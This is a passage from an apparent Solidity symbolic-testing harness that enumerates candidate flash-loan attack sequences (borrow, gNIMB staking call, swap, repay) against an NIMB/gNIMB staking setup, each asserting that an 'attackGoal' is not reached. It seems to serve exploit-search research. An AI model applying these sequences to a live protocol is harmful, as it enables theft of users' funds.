        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand050(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand051(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand052(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand053(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand054(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand055(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand056(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand057(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand058(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand059(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand060(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
